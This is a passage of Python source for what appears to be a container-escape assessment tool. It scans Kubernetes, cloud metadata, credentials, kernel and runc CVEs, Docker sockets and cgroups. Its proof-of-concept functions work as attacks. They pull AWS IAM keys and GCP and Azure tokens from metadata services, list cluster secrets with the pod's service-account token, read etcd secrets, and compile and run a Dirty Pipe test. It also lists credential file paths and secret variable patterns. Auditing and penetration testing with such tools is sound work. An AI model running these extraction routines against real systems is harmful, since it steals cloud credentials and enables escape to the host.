                severity=Severity.CRITICAL if port == 10250 else Severity.HIGH,
                detail=f"Port {port} ({'authenticated' if port == 10250 else 'read-only'}) is accessible. "
                       "May allow container creation/exec on the node.",
                poc_available=True,
                poc_description="Query kubelet API for pods and exec capability",
                poc_func=lambda ctx, p=port: poc_kubelet_api(ctx, p),
            ))

    # Check for etcd
    if tcp_connect("127.0.0.1", 2379, timeout=1.5):
        findings.append(Finding(
            category="Kubernetes",
            title="etcd accessible on port 2379",
            severity=Severity.CRITICAL,
            detail="etcd contains all Kubernetes secrets, configs, and state.",
            poc_available=True,
            poc_description="Query etcd for stored secrets",
            poc_func=poc_etcd,
        ))

    # Check for helm secrets/tiller
    tiller_ns = os.environ.get("TILLER_NAMESPACE")
    if tiller_ns or tcp_connect("127.0.0.1", 44134, timeout=1.0):
        findings.append(Finding(
            category="Kubernetes",
            title="Tiller (Helm v2) possibly accessible",
            severity=Severity.HIGH,
            detail="Tiller has elevated Kubernetes privileges. Can deploy arbitrary workloads.",
        ))

    return findings


def poc_k8s_api(ctx: AssessmentContext) -> bool:
    """PoC: Query Kubernetes API with service account token."""
    print(f"\n    {BOLD}PoC: Kubernetes API Enumeration{RESET}\n")

    token = read_file("/var/run/secrets/kubernetes.io/serviceaccount/token")
    ca_cert = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
    namespace = read_file("/var/run/secrets/kubernetes.io/serviceaccount/namespace") or "default"
    api_host = os.environ.get("KUBERNETES_SERVICE_HOST", "kubernetes.default.svc")
    api_port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
    base_url = f"https://{api_host}:{api_port}"

    if not token:
        print(f"    {RED}✗ No service account token available{RESET}")
        return False

    # Check permissions
    endpoints = [
        (f"{base_url}/api/v1/namespaces/{namespace}/pods", "List pods in namespace"),
        (f"{base_url}/api/v1/namespaces/{namespace}/secrets", "List secrets in namespace"),
        (f"{base_url}/api/v1/pods", "List all pods (cluster-wide)"),
        (f"{base_url}/api/v1/secrets", "List all secrets (cluster-wide)"),
        (f"{base_url}/api/v1/nodes", "List nodes"),
        (f"{base_url}/apis/rbac.authorization.k8s.io/v1/clusterrolebindings", "List RBAC bindings"),
    ]

    found_access = False
    for url, desc in endpoints:
        r = run_cmd(
            f"curl -sk -H 'Authorization: Bearer {token}' --cacert {ca_cert} '{url}' 2>/dev/null "
            f"| head -c 500",
            shell=True, timeout=5
        )
        if r.rc == 0 and r.out and '"items"' in r.out:
            print(f"    {RED}★ {desc}: ACCESSIBLE{RESET}")
            found_access = True
        elif r.rc == 0 and "Forbidden" in r.out:
            print(f"    {DIM}  {desc}: Forbidden{RESET}")
        else:
            print(f"    {DIM}  {desc}: {r.out[:50] if r.out else 'No response'}{RESET}")

    # auth can-i check via API
    auth_check = {
        "apiVersion": "authorization.k8s.io/v1",
        "kind": "SelfSubjectRulesReview",
        "spec": {"namespace": namespace}
    }
    r = run_cmd(
        f"curl -sk -X POST -H 'Authorization: Bearer {token}' "
        f"-H 'Content-Type: application/json' --cacert {ca_cert} "
        f"'{base_url}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews' "
        f"-d '{json.dumps(auth_check)}' 2>/dev/null | head -c 2000",
        shell=True, timeout=5
    )
    if r.rc == 0 and "resourceRules" in r.out:
        print(f"\n    {RED}★ Service account permissions retrieved!{RESET}")
        print(f"    {DIM}{r.out[:500]}{RESET}")
        found_access = True

    return found_access


def poc_kubelet_api(ctx: AssessmentContext, port: int) -> bool:
    """PoC: Query kubelet API."""
    print(f"\n    {BOLD}PoC: Kubelet API (port {port}){RESET}\n")

    endpoints = [
        (f"https://127.0.0.1:{port}/pods", "List pods on node"),
        (f"https://127.0.0.1:{port}/runningpods/", "Running pods"),
        (f"https://127.0.0.1:{port}/metrics", "Metrics"),
    ]

    if port == 10255:
        endpoints = [
            (f"http://127.0.0.1:{port}/pods", "List pods on node"),
            (f"http://127.0.0.1:{port}/metrics", "Metrics"),
        ]

    found = False
    for url, desc in endpoints:
        r = run_cmd(f"curl -sk '{url}' 2>/dev/null | head -c 500", shell=True, timeout=5)
        if r.rc == 0 and r.out and len(r.out) > 10:
            print(f"    {RED}★ {desc}: Response received ({len(r.out)} bytes){RESET}")
            found = True

    return found


def poc_etcd(ctx: AssessmentContext) -> bool:
    """PoC: Query etcd for secrets."""
    print(f"\n    {BOLD}PoC: etcd Access{RESET}\n")

    endpoints = [
        ("http://127.0.0.1:2379/version", "Version"),
        ("http://127.0.0.1:2379/v2/keys/?recursive=true", "Key listing (v2)"),
    ]

    found = False
    for url, desc in endpoints:
        r = run_cmd(f"curl -s '{url}' 2>/dev/null | head -c 500", shell=True, timeout=5)
        if r.rc == 0 and r.out and len(r.out) > 5:
            print(f"    {RED}★ {desc}: {r.out[:200]}{RESET}")
            found = True

    # v3 API
    r = run_cmd(
        "curl -s http://127.0.0.1:2379/v3/kv/range -X POST "
        "-d '{\"key\": \"L3JlZ2lzdHJ5L3NlY3JldHMv\"}' 2>/dev/null | head -c 500",
        shell=True, timeout=5
    )
    if r.rc == 0 and r.out and "kvs" in r.out:
        print(f"    {RED}{BOLD}★ etcd v3 secrets accessible!{RESET}")
        found = True

    return found


# ═══════════════════════════════════════════════════════════════════════════════
# 9. CLOUD METADATA SERVICE
# ═══════════════════════════════════════════════════════════════════════════════

def check_cloud_metadata(ctx: AssessmentContext) -> List[Finding]:
    """Check cloud metadata service accessibility."""
    findings = []

    for cloud, (host, port, url) in METADATA_ENDPOINTS.items():
        if tcp_connect(host, port, timeout=2):
            headers = {}
            if cloud == "GCP":
                headers["Metadata-Flavor"] = "Google"
            elif cloud == "Azure":
                headers["Metadata"] = "true"

            status, body = http_get(url, headers=headers, timeout=3)

            if status >= 200 and status < 400 and body:
                findings.append(Finding(
                    category="Cloud Metadata",
                    title=f"{cloud} metadata service accessible",
                    severity=Severity.HIGH,
                    detail=f"Cloud metadata service at {host} is reachable. "
                           "May expose IAM credentials, instance identity, and secrets.",
                    evidence=f"HTTP {status}: {body[:200]}",
                    poc_available=True,
                    poc_description=f"Extract {cloud} IAM credentials and instance metadata",
                    poc_func=lambda ctx, c=cloud: poc_metadata_extract(ctx, c),
                    remediation=f"Block metadata service access from containers. "
                                f"Use {'IMDSv2' if cloud == 'AWS' else 'network policies'} "
                                f"to restrict access.",
                ))
            elif status > 0:
                findings.append(Finding(
                    category="Cloud Metadata",
                    title=f"{cloud} metadata service reachable (HTTP {status})",
                    severity=Severity.MEDIUM,
                    detail=f"Metadata endpoint returned HTTP {status}. "
                           "Partial access or version-restricted.",
                ))

    return findings


def poc_metadata_extract(ctx: AssessmentContext, cloud: str) -> bool:
    """PoC: Extract cloud metadata and credentials."""
    print(f"\n    {BOLD}PoC: {cloud} Metadata Service Extraction{RESET}\n")

    if cloud == "AWS":
        return _poc_aws_metadata()
    elif cloud == "GCP":
        return _poc_gcp_metadata()
    elif cloud == "Azure":
        return _poc_azure_metadata()
    return False


def _poc_aws_metadata() -> bool:
    # Try IMDSv1 first
    urls = [
        ("http://169.254.169.254/latest/meta-data/instance-id", "Instance ID"),
        ("http://169.254.169.254/latest/meta-data/iam/info", "IAM Info"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "IAM Role Name"),
        ("http://169.254.169.254/latest/user-data", "User Data"),
    ]

    found = False
    role_name = None

    for url, label in urls:
        status, body = http_get(url, timeout=3)
        if status == 200 and body:
            print(f"    {RED}★ {label}: {body[:200]}{RESET}")
            found = True
            if "security-credentials" in url and "/" not in body:
                role_name = body.strip()

    # If we got a role name, get the actual credentials
    if role_name:
        cred_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
        status, body = http_get(cred_url, timeout=3)
        if status == 200 and body:
            print(f"\n    {RED}{BOLD}★ IAM CREDENTIALS EXTRACTED!{RESET}")
            try:
                creds = json.loads(body)
                print(f"    {RED}  AccessKeyId: {creds.get('AccessKeyId', 'N/A')}{RESET}")
                print(f"    {RED}  SecretAccessKey: {creds.get('SecretAccessKey', 'N/A')[:20]}...{RESET}")
                print(f"    {RED}  Token: {creds.get('Token', 'N/A')[:30]}...{RESET}")
                print(f"    {RED}  Expiration: {creds.get('Expiration', 'N/A')}{RESET}")
            except json.JSONDecodeError:
                print(f"    {RED}  Raw credentials: {body[:300]}{RESET}")
            found = True

    # Try IMDSv2 if v1 failed
    if not found:
        print(f"\n    {DIM}  IMDSv1 may be blocked. Trying IMDSv2...{RESET}")
        # Get token
        r = run_cmd(
            'curl -s -X PUT "http://169.254.169.254/latest/api/token" '
            '-H "X-aws-ec2-metadata-token-ttl-seconds: 21600"',
            shell=True, timeout=3
        )
        if r.rc == 0 and r.out:
            token = r.out.strip()
            status, body = http_get(
                "http://169.254.169.254/latest/meta-data/instance-id",
                headers={"X-aws-ec2-metadata-token": token},
                timeout=3,
            )
            if status == 200:
                print(f"    {RED}★ IMDSv2 works! Instance ID: {body}{RESET}")
                found = True

    return found


def _poc_gcp_metadata() -> bool:
    headers = {"Metadata-Flavor": "Google"}
    urls = [
        ("http://metadata.google.internal/computeMetadata/v1/instance/hostname", "Hostname"),
        ("http://metadata.google.internal/computeMetadata/v1/instance/zone", "Zone"),
        ("http://metadata.google.internal/computeMetadata/v1/project/project-id", "Project ID"),
        ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", "Service Accounts"),
    ]

    found = False
    sa_email = None

    for url, label in urls:
        status, body = http_get(url, headers=headers, timeout=3)
        if status == 200 and body:
            print(f"    {RED}★ {label}: {body[:200]}{RESET}")
            found = True
            if "service-accounts" in url:
                sa_email = body.strip().split("\n")[0].rstrip("/")

    # Get access token
    if sa_email:
        token_url = (f"http://metadata.google.internal/computeMetadata/v1/instance/"
                     f"service-accounts/{sa_email}/token")
        status, body = http_get(token_url, headers=headers, timeout=3)
        if status == 200:
            print(f"\n    {RED}{BOLD}★ GCP ACCESS TOKEN EXTRACTED!{RESET}")
            try:
                tok = json.loads(body)
                print(f"    {RED}  Access Token: {tok.get('access_token', 'N/A')[:40]}...{RESET}")
                print(f"    {RED}  Type: {tok.get('token_type', 'N/A')}{RESET}")
                print(f"    {RED}  Expires: {tok.get('expires_in', 'N/A')} seconds{RESET}")
            except:
                print(f"    {RED}  Raw: {body[:200]}{RESET}")
            found = True

    return found


def _poc_azure_metadata() -> bool:
    headers = {"Metadata": "true"}
    urls = [
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Instance Info"),
        ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"
         "&resource=https://management.azure.com/", "Managed Identity Token"),
    ]

    found = False
    for url, label in urls:
        status, body = http_get(url, headers=headers, timeout=3)
        if status == 200 and body:
            print(f"    {RED}★ {label}: {body[:300]}{RESET}")
            found = True

    return found


# ═══════════════════════════════════════════════════════════════════════════════
# 10. ENVIRONMENT & CREDENTIAL LEAKAGE
# ═══════════════════════════════════════════════════════════════════════════════

def check_env_credentials(ctx: AssessmentContext) -> List[Finding]:
    """Check for leaked credentials in environment variables and files."""
    findings = []

    # Sensitive environment variable patterns
    sensitive_patterns = [
        (r"(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)", "AWS Credentials"),
        (r"(AZURE_CLIENT_SECRET|AZURE_TENANT_ID|AZURE_CLIENT_ID)", "Azure Credentials"),
        (r"(GOOGLE_APPLICATION_CREDENTIALS|GCLOUD_PROJECT)", "GCP Credentials"),
        (r"(DATABASE_URL|DB_PASSWORD|DB_PASS|MYSQL_ROOT_PASSWORD)", "Database Credentials"),
        (r"(DOCKER_AUTH_CONFIG|REGISTRY_AUTH)", "Docker Registry Auth"),
        (r"(GITHUB_TOKEN|GH_TOKEN|GITLAB_TOKEN)", "SCM Token"),
        (r"(API_KEY|API_SECRET|SECRET_KEY|PRIVATE_KEY|ENCRYPTION_KEY)", "API/Encryption Key"),
        (r"(JWT_SECRET|SESSION_SECRET|APP_SECRET)", "Application Secret"),
        (r"(SLACK_TOKEN|SLACK_WEBHOOK)", "Slack Token"),
        (r"(REDIS_PASSWORD|REDIS_URL|MONGO_URI)", "Data Store Credentials"),
        (r"(SMTP_PASSWORD|MAIL_PASSWORD|EMAIL_PASSWORD)", "Email Credentials"),
        (r"(SSH_PRIVATE_KEY|SSH_KEY)", "SSH Key"),
        (r"(VAULT_TOKEN|VAULT_ADDR)", "Vault Token"),
    ]

    env_leaks = []
    for pattern, desc in sensitive_patterns:
        for key, value in os.environ.items():
            if re.search(pattern, key, re.IGNORECASE):
                masked = value[:4] + "..." + value[-4:] if len(value) > 12 else "***"
                env_leaks.append((key, masked, desc))

    if env_leaks:
        evidence_lines = [f"{k}={v} ({d})" for k, v, d in env_leaks]
        findings.append(Finding(
            category="Credential Leakage",
            title=f"Sensitive environment variables found ({len(env_leaks)})",
            severity=Severity.HIGH,
            detail="Environment variables containing potential credentials or secrets detected.",
            evidence="\n".join(evidence_lines[:10]),
            remediation="Use secrets management (Vault, K8s secrets, etc.) instead of environment variables.",
        ))

    # Check for credential files
    cred_paths = [
        "/root/.aws/credentials", "/root/.aws/config",
        "/root/.docker/config.json",
        "/root/.kube/config",
        "/root/.ssh/id_rsa", "/root/.ssh/id_ed25519",
        "/root/.git-credentials", "/root/.netrc",
        "/root/.bash_history",
        "/home/*/.aws/credentials", "/home/*/.ssh/id_rsa",
        "/home/*/.docker/config.json",
        "/etc/kubernetes/admin.conf",
        "/var/lib/kubelet/kubeconfig",
    ]

    for pattern in cred_paths:
        for path in glob.glob(pattern):
            if file_exists(path) and file_accessible(path, os.R_OK):
                size = os.path.getsize(path) if os.path.isfile(path) else 0
                findings.append(Finding(
                    category="Credential Leakage",
                    title=f"Credential file accessible: {path}",
                    severity=Severity.HIGH,
                    detail=f"Sensitive credential file found and readable ({size} bytes).",
                    remediation="Do not mount credential directories into containers.",
                ))

    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# 11. CVE-BASED ESCAPE CHECKS
# ═══════════════════════════════════════════════════════════════════════════════

def check_known_cves(ctx: AssessmentContext) -> List[Finding]:
    """Check for known container escape CVEs based on versions."""
    findings = []
    major, minor, patch = parse_kernel_version(ctx.kernel_release)

    # Kernel CVEs
    # CVE-2022-0847 - Dirty Pipe (5.8 <= kernel <= 5.16.11)
    if kernel_version_between(ctx.kernel_release, (5, 8, 0), (5, 16, 11)):
        findings.append(Finding(
            category="Known CVEs",
            title="CVE-2022-0847 (Dirty Pipe) - Kernel may be vulnerable",
            severity=Severity.CRITICAL,
            detail="Kernel version is in the affected range for Dirty Pipe. "
                   "Allows arbitrary file overwrite, including read-only files.",
            evidence=f"Kernel: {ctx.kernel_release}",
            poc_available=True,
            poc_description="Check if splice() pipe behavior indicates vulnerability",
            poc_func=poc_dirty_pipe_check,
            remediation="Upgrade kernel to 5.16.12+, 5.15.26+, or 5.10.103+",
        ))

    # CVE-2022-0185 - fsconfig heap overflow
    if kernel_version_between(ctx.kernel_release, (5, 1, 0), (5, 16, 2)):
        # Also needs CAP_SYS_ADMIN or userns
        has_surface = "CAP_SYS_ADMIN" in ctx.cap_names or not ctx.userns_active
        if has_surface:
            findings.append(Finding(
                category="Known CVEs",
                title="CVE-2022-0185 - Kernel heap overflow (fsconfig)",
                severity=Severity.CRITICAL,
                detail="Kernel in affected range and attack surface available "
                       "(CAP_SYS_ADMIN or unconfined user namespace).",
                evidence=f"Kernel: {ctx.kernel_release}",
                remediation="Upgrade kernel to 5.16.3+",
            ))

    # CVE-2023-0386 - OverlayFS
    if major == 5 or (major == 6 and minor < 2):
        findings.append(Finding(
            category="Known CVEs",
            title="CVE-2023-0386 - OverlayFS privilege escalation (potential)",
            severity=Severity.HIGH,
            detail="Kernel may be vulnerable to OverlayFS setuid copy-up bypass.",
            evidence=f"Kernel: {ctx.kernel_release}",
            remediation="Upgrade kernel to 6.2+",
        ))

    # CVE-2023-32233 - nf_tables
    if major < 6 or (major == 6 and minor < 4):
        findings.append(Finding(
            category="Known CVEs",
            title="CVE-2023-32233 - nf_tables use-after-free (potential)",
            severity=Severity.MEDIUM,
            detail="Kernel may be vulnerable to netfilter nf_tables privilege escalation.",
            evidence=f"Kernel: {ctx.kernel_release}",
            remediation="Upgrade kernel to 6.4+",
        ))

    # Runtime version checks
    r = run_cmd("runc --version 2>/dev/null || docker run --rm alpine runc --version 2>/dev/null",
                shell=True, timeout=10)
    if r.rc == 0 and r.out:
        runc_match = re.search(r"runc version (\d+\.\d+\.\d+)", r.out)
        if runc_match:
            runc_ver = runc_match.group(1)
            rv = tuple(int(x) for x in runc_ver.split("."))

            # CVE-2024-21626 (runc < 1.1.12)
            if rv < (1, 1, 12):
                findings.append(Finding(
                    category="Known CVEs",
                    title=f"CVE-2024-21626 - runc container breakout (runc {runc_ver})",
                    severity=Severity.CRITICAL,
                    detail="runc version is vulnerable to process.cwd container breakout via leaked fd.",
                    evidence=f"runc version: {runc_ver}",
                    remediation="Upgrade runc to 1.1.12+",
                ))

            # CVE-2019-5736 (runc < 1.0.0-rc6)
            if rv < (1, 0, 0):
                findings.append(Finding(
                    category="Known CVEs",
                    title=f"CVE-2019-5736 - runc /proc/self/exe overwrite (runc {runc_ver})",
                    severity=Severity.CRITICAL,
                    detail="runc vulnerable to container escape via /proc/self/exe overwrite.",
                    evidence=f"runc version: {runc_ver}",
                    remediation="Upgrade runc to 1.0.0-rc6+",
                ))

    # Docker version check
    r = run_cmd("docker version --format '{{.Server.Version}}' 2>/dev/null", shell=True, timeout=5)
    if r.rc == 0 and r.out:
        docker_ver = r.out.strip()
        dv_match = re.match(r"(\d+)\.(\d+)\.(\d+)", docker_ver)
        if dv_match:
            dv = tuple(int(x) for x in dv_match.groups())
            if dv < (20, 10, 9):
                findings.append(Finding(
                    category="Known CVEs",
                    title=f"CVE-2021-41091 - Docker data directory traversal (Docker {docker_ver})",
                    severity=Severity.HIGH,
                    detail="Docker Engine vulnerable to data directory traversal.",
                    evidence=f"Docker version: {docker_ver}",
                    remediation="Upgrade Docker Engine to 20.10.9+",
                ))

    return findings


def poc_dirty_pipe_check(ctx: AssessmentContext) -> bool:
    """PoC: Check if kernel exhibits Dirty Pipe behavior."""
    print(f"\n    {BOLD}PoC: CVE-2022-0847 (Dirty Pipe) Check{RESET}")
    print(f"    {DIM}Checking if splice() allows writing to read-only files.{RESET}\n")

    # Create a simple C checker
    checker_c = r"""
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

int main() {
    /* Create a test file */
    const char *path = "/tmp/dirtypipe_test";
    FILE *f = fopen(path, "w");
    if (!f) { printf("SKIP\n"); return 1; }
    fprintf(f, "AAAAAAAAAAAAAAAA");
    fclose(f);
    chmod(path, 0444);

    /* Try to overwrite via pipe splice */
    int fd = open(path, O_RDONLY);
    if (fd < 0) { printf("SKIP\n"); return 1; }

    int p[2];
    if (pipe(p) < 0) { printf("SKIP\n"); return 1; }

    /* Fill and drain pipe to set PIPE_BUF_FLAG_CAN_MERGE */
    char buf[4096];
    memset(buf, 'B', sizeof(buf));
    write(p[1], buf, sizeof(buf));
    read(p[0], buf, sizeof(buf));

    /* splice from file, then try to write over */
    ssize_t n = splice(fd, NULL, p[1], NULL, 1, 0);
    if (n < 0) { printf("NOT_VULNERABLE\n"); return 0; }

    /* Try writing to pipe (which should overwrite file page cache) */
    n = write(p[1], "PWNED", 5);
    close(fd);
    close(p[0]);
    close(p[1]);

    /* Read back the file */
    f = fopen(path, "r");
    if (f) {
        char result[32] = {0};
        fread(result, 1, 16, f);
        fclose(f);
        if (strncmp(result + 1, "PWNED", 5) == 0) {
            printf("VULNERABLE\n");
        } else {
            printf("NOT_VULNERABLE\n");
        }
    }
    unlink(path);
    return 0;
}
"""
    if not shutil.which("gcc"):
        print(f"    {YELLOW}⚠ gcc not available. Kernel is in affected range ({ctx.kernel_release}).{RESET}")
        print(f"    {DIM}  Cannot compile check binary. Consider manual verification.{RESET}")
        return False

    c_path = "/tmp/dirtypipe_check.c"
    bin_path = "/tmp/dirtypipe_check"
    try:
        with open(c_path, "w") as f:
            f.write(checker_c)
        r = run_cmd(f"gcc -o {bin_path} {c_path}")
        if r.rc != 0:
            print(f"    {YELLOW}⚠ Compilation failed: {r.err}{RESET}")
            return False

        r = run_cmd(bin_path, timeout=5)
        os.unlink(c_path)
        os.unlink(bin_path)

        if "VULNERABLE" in r.out and "NOT_VULNERABLE" not in r.out:
            print(f"    {RED}{BOLD}★ VULNERABLE to Dirty Pipe!{RESET}")
            print(f"    {RED}  Can overwrite arbitrary read-only files including host files.{RESET}")
            return True
        elif "NOT_VULNERABLE" in r.out:
            print(f"    {GREEN}✓ Not vulnerable (patched or mitigated){RESET}")
            return False
        else:
            print(f"    {YELLOW}⚠ Inconclusive: {r.out}{RESET}")
            return False
    except Exception as e:
        print(f"    {YELLOW}⚠ Error: {e}{RESET}")
        return False


# ═══════════════════════════════════════════════════════════════════════════════
# 12. NETWORK-BASED CHECKS
# ═══════════════════════════════════════════════════════════════════════════════

def check_network_security(ctx: AssessmentContext) -> List[Finding]:
    """Check network-based escape vectors and exposure."""
    findings = []

    # Check if we're on host network
    r = run_cmd("cat /proc/1/net/tcp 2>/dev/null | wc -l", shell=True)
    r2 = run_cmd("cat /proc/self/net/tcp 2>/dev/null | wc -l", shell=True)

    # Check for access to common services
    services = [
        ("127.0.0.1", 22, "SSH"),
        ("127.0.0.1", 2375, "Docker API (unencrypted)"),
        ("127.0.0.1", 2376, "Docker API (TLS)"),
        ("127.0.0.1", 5000, "Docker Registry"),
        ("127.0.0.1", 6443, "Kubernetes API"),
        ("127.0.0.1", 8080, "HTTP/Proxy"),
        ("127.0.0.1", 8443, "HTTPS/Alt"),
        ("127.0.0.1", 9090, "Prometheus"),
        ("127.0.0.1", 3306, "MySQL"),
        ("127.0.0.1", 5432, "PostgreSQL"),
        ("127.0.0.1", 6379, "Redis"),
        ("127.0.0.1", 27017, "MongoDB"),
    ]

    accessible_services = []
    for host, port, name in services:
        if tcp_connect(host, port, timeout=1):
            accessible_services.append((host, port, name))

    if accessible_services:
        evidence = "\n".join(f"  {h}:{p} ({n})" for h, p, n in accessible_services)
        sev = Severity.CRITICAL if any(
            n in ("Docker API (unencrypted)", "Docker Registry", "Kubernetes API")
            for _, _, n in accessible_services
        ) else Severity.MEDIUM

        findings.append(Finding(
            category="Network",
            title=f"Accessible services from container ({len(accessible_services)})",
            severity=sev,
            detail="The following services are reachable from within the container.",
            evidence=evidence,
        ))

    # Docker API over TCP
    for port in [2375, 2376]:
        if tcp_connect("127.0.0.1", port, timeout=1):
            r = run_cmd(f"curl -s http://127.0.0.1:{port}/version 2>/dev/null", shell=True, timeout=3)
            if r.rc == 0 and ("Version" in r.out or "ApiVersion" in r.out):
                findings.append(Finding(
                    category="Network",
                    title=f"Docker API accessible over TCP (port {port})",
                    severity=Severity.CRITICAL,
                    detail="Docker daemon API is accessible over TCP. "
                           "Full container management and host access possible.",
                    evidence=r.out[:200],
                    poc_available=True,
                    poc_description="Execute commands on host via Docker API",
                    poc_func=lambda ctx, p=port: poc_docker_tcp_api(ctx, p),
                ))

    # Check for containerd-shim abstract socket (CVE-2020-15257)
    r = run_cmd("cat /proc/net/unix 2>/dev/null | grep -i containerd-shim", shell=True)
    if r.rc == 0 and r.out:
        findings.append(Finding(
            category="Network",
            title="containerd-shim abstract socket detected (CVE-2020-15257)",
            severity=Severity.HIGH,
            detail="Abstract unix socket for containerd-shim found. May be exploitable "
                   "for container escape depending on containerd version.",
            evidence=r.out[:200],
        ))

    return findings


def poc_docker_tcp_api(ctx: AssessmentContext, port: int) -> bool:
    """PoC: Docker API over TCP."""
    print(f"\n    {BOLD}PoC: Docker TCP API (port {port}){RESET}\n")

    r = run_cmd(f"curl -s http://127.0.0.1:{port}/info 2>/dev/null", shell=True, timeout=5)
    if r.rc == 0 and r.out:
        try:
            info = json.loads(r.out)
            print(f"    {RED}★ Docker Engine: {info.get('ServerVersion', '?')}{RESET}")
            print(f"    {RED}  OS: {info.get('OperatingSystem', '?')}{RESET}")
            print(f"    {RED}  Containers: {info.get('Containers', '?')}{RESET}")
            print(f"    {RED}{BOLD}★ Full Docker API control available!{RESET}")
            return True
        except:
            print(f"    {RED}★ API response: {r.out[:200]}{RESET}")
            return True
    return False


# ═══════════════════════════════════════════════════════════════════════════════
# 13. cgroup ESCAPE (v1 & v2)
# ═══════════════════════════════════════════════════════════════════════════════

def check_cgroup_escape(ctx: AssessmentContext) -> List[Finding]:
    """Check for cgroup-based escape vectors."""
    findings = []

    # Determine cgroup version
    r = run_cmd("stat -fc %T /sys/fs/cgroup")
    cgroup_fstype = r.out if r.rc == 0 else ""

    is_v2 = "cgroup2" in cgroup_fstype
    is_v1 = "tmpfs" in cgroup_fstype or "cgroup" in cgroup_fstype

    findings.append(Finding(
        category="cgroup",
        title=f"cgroup version: {'v2' if is_v2 else 'v1' if is_v1 else 'unknown'} ({cgroup_fstype})",
        severity=Severity.INFO,
        detail="cgroup v1 is more susceptible to release_agent escapes.",
    ))

    # Check release_agent writability (v1)
    if is_v1:
        release_agents = glob.glob("/sys/fs/cgroup/*/release_agent")
        for ra in release_agents:
            try:
                with open(ra, "a"):
                    pass
                findings.append(Finding(
                    category="cgroup",
                    title=f"Writable release_agent: {ra}",
                    severity=Severity.CRITICAL,
                    detail="cgroup release_agent is writable. Classic container escape vector. "
                           "Write a command path and trigger by emptying cgroup to execute on host.",
                    poc_available=True,
                    poc_description="Execute command on host via release_agent",
                    poc_func=poc_cap_sys_admin,  # Reuse the cgroup escape PoC
                    remediation="Mount cgroup filesystem read-only or use cgroup v2.",
                ))
            except:
                pass

    # Check if we can create cgroups
    if ctx.is_root or ctx.sudo_passwordless:
        prefix = "sudo -n " if not ctx.is_root else ""
        test_path = "/sys/fs/cgroup/memory/escape_test" if is_v1 else "/sys/fs/cgroup/escape_test"
        r = run_cmd(f"{prefix}mkdir -p {test_path}")
        if r.rc == 0:
            findings.append(Finding(
                category="cgroup",
                title="Can create new cgroups",
                severity=Severity.MEDIUM,
                detail="Ability to create cgroups may assist in escape techniques.",
            ))
            run_cmd(f"{prefix}rmdir {test_path}")

    # Notify on release
    for path in glob.glob("/sys/fs/cgroup/*/*/notify_on_release"):
        content = read_file(path)
        if content == "1":
            findings.append(Finding(
                category="cgroup",
                title=f"notify_on_release enabled: {path}",
                severity=Severity.MEDIUM,
                detail="A cgroup has notify_on_release enabled. Could be leveraged with writable release_agent.",
            ))
            break

    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# 14. ADDITIONAL FILESYSTEM CHECKS
# ═══════════════════════════════════════════════════════════════════════════════

def check_filesystem_security(ctx: AssessmentContext) -> List[Finding]:
    """Additional filesystem security checks."""
    findings = []

    # Check if root filesystem is read-only
    r = run_cmd("touch /tmp/.write_test 2>&1", shell=True)
    if r.rc == 0:
        os.unlink("/tmp/.write_test")
        # Check actual rootfs
        r = run_cmd("touch /.write_test_root 2>&1", shell=True)
        if r.rc == 0:
            try:
                os.unlink("/.write_test_root")
            except:
                pass
            findings.append(Finding(
                category="Filesystem",
                title="Root filesystem is writable",
                severity=Severity.LOW,
                detail="Container root filesystem is writable. Consider read-only rootfs.",
                remediation="Use --read-only flag when running containers.",
            ))

    # Check /proc mount options
    for line in ctx.mounts_text.splitlines():
        if " /proc " in line or " /proc/" in line:
            if "rw" in line.split()[5] if len(line.split()) > 5 else "":
                # /proc mounted rw is concerning for certain paths
                pass

    # Check for fdisk/lsblk to enumerate disks
    if shutil.which("fdisk") or shutil.which("lsblk"):
        r = run_cmd("lsblk 2>/dev/null || fdisk -l 2>/dev/null", shell=True, timeout=5)
        if r.rc == 0 and r.out and ("disk" in r.out.lower() or "/dev/" in r.out):
            findings.append(Finding(
                category="Filesystem",
                title="Block device enumeration possible",
                severity=Severity.MEDIUM,
                detail="Can enumerate host block devices, which may indicate device access.",
                evidence=r.out[:300],
            ))

    # debugfs check
    if shutil.which("debugfs"):
        findings.append(Finding(
            category="Filesystem",
            title="debugfs available - filesystem debugging tool",
            severity=Severity.MEDIUM,
            detail="debugfs can read/write ext2/3/4 filesystem images directly, "
                   "bypassing normal permissions.",
        ))

    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN ASSESSMENT ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

# All check modules in execution order
CHECK_MODULES = [
    ("Container Environment",          check_container_info),
    ("Linux Capabilities",             check_capabilities),
    ("Docker/Runtime Socket Exposure", check_docker_socket),
    ("procfs/sysfs Abuse Vectors",     check_procfs_sysfs),
    ("Namespace Isolation",            check_namespaces),
    ("Host Mount Detection",           check_host_mounts),
    ("cgroup Escape Vectors",          check_cgroup_escape),
    ("Security Profiles",              check_security_profiles),
    ("Kubernetes Environment",         check_kubernetes),
    ("Cloud Metadata Service",         check_cloud_metadata),
    ("Environment & Credentials",      check_env_credentials),
    ("Known CVE Detection",            check_known_cves),
    ("Network Security",               check_network_security),
    ("Filesystem Security",            check_filesystem_security),
]


def run_assessment(ctx: AssessmentContext):
    """Main assessment orchestrator."""
    banner()

    # Display system info
    section_header("System Information")
    r = run_cmd("id")
    print(f"  User:     {r.out}")
    r = run_cmd("uname -a")
    print(f"  Kernel:   {r.out}")
    print(f"  Platform: {platform.platform()}")
    print(f"  Root:     {'Yes' if ctx.is_root else 'No'}")
    print(f"  Sudo:     {'Passwordless' if ctx.sudo_passwordless else 'Available' if ctx.sudo_available else 'No'}")
    print(f"  Container: {'Yes' if ctx.in_container else 'No/Unknown'} ({ctx.container_runtime})")
    print(f"  Userns:   {'Active' if ctx.userns_active else 'Not active'}")

    # Run all check modules
    all_findings: List[Finding] = []
